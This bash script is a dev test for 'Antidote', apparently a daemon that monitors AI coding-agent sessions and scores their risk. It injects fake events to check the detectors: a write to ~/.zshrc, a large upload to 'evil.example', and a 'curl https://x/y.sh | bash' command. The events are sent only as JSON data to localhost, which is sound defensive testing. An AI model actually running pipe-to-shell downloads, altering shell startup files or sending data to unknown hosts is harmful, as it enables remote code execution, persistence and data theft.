#!/bin/bash
# Phase 1 dev test script for Antidote

set -e

API_URL="http://localhost:17845"

echo "=== Antidote Phase 1 Dev Test ==="
echo ""

# Check if daemon is running
echo "1. Checking daemon health..."
if ! curl -s "$API_URL/health" > /dev/null; then
    echo "ERROR: Daemon is not running. Start it with: cargo run -p antidote-daemon"
    exit 1
fi
echo "✓ Daemon is running"
echo ""

# List sessions
echo "2. Listing sessions..."
curl -s "$API_URL/sessions" | jq '.' || echo "No sessions yet"
echo ""

# Wait for a session (user should launch Cursor manually)
echo "3. Waiting for a session to appear (launch Cursor manually)..."
for i in {1..30}; do
    SESSIONS=$(curl -s "$API_URL/sessions" | jq 'length')
    if [ "$SESSIONS" -gt 0 ]; then
        echo "✓ Session detected!"
        SESSION_ID=$(curl -s "$API_URL/sessions" | jq -r '.[0].session_id')
        echo "  Session ID: $SESSION_ID"
        break
    fi
    sleep 1
done

if [ -z "$SESSION_ID" ]; then
    echo "WARNING: No session found. Continuing with test events anyway..."
    SESSION_ID="pending"
fi
echo ""

# Inject test events
echo "4. Injecting test events..."

# FileWrite to ~/.zshrc (should flag PersistenceModification)
echo "  - FileWrite to ~/.zshrc..."
curl -s -X POST "$API_URL/debug/emit" \
  -H "Content-Type: application/json" \
  -d "{
    \"session_id\": \"$SESSION_ID\",
    \"event_type\": \"FILE_WRITE\",
    \"payload\": {
      \"path\": \"~/.zshrc\",
      \"bytes\": 100
    }
  }" | jq '.'
echo ""

# NetHttp to unknown domain with high egress
echo "  - NetHttp to unknown domain with high egress..."
curl -s -X POST "$API_URL/debug/emit" \
  -H "Content-Type: application/json" \
  -d "{
    \"session_id\": \"$SESSION_ID\",
    \"event_type\": \"NET_HTTP\",
    \"payload\": {
      \"domain\": \"evil.example\",
      \"bytes_out\": 2000000,
      \"bytes_in\": 1000
    }
  }" | jq '.'
echo ""

# Dangerous command
echo "  - Dangerous command (curl | bash)..."
curl -s -X POST "$API_URL/debug/emit" \
  -H "Content-Type: application/json" \
  -d "{
    \"session_id\": \"$SESSION_ID\",
    \"event_type\": \"CMD_EXEC\",
    \"payload\": {
      \"argv\": [\"curl\", \"https://x/y.sh\", \"|\", \"bash\"]
    }
  }" | jq '.'
echo ""

# Wait a bit for processing
echo "5. Waiting for processing..."
sleep 3
echo ""

# Get session summary
echo "6. Fetching session summary..."
if [ "$SESSION_ID" != "pending" ]; then
    curl -s "$API_URL/sessions/$SESSION_ID/summary" | jq '.'
    RISK_SCORE=$(curl -s "$API_URL/sessions/$SESSION_ID/summary" | jq -r '.risk.score // 0')
    echo ""
    echo "Risk Score: $RISK_SCORE"
    if [ "$RISK_SCORE" -gt 60 ]; then
        echo "✓ Risk score > 60 (High) - Test PASSED"
    else
        echo "⚠ Risk score <= 60 - Test may need more events or time"
    fi
else
    echo "No session ID available for summary"
fi
echo ""

# List flags
echo "7. Listing flags for session..."
if [ "$SESSION_ID" != "pending" ]; then
    curl -s "$API_URL/sessions/$SESSION_ID/flags" | jq '.'
else
    echo "No session ID available"
fi
echo ""

echo "=== Test Complete ==="
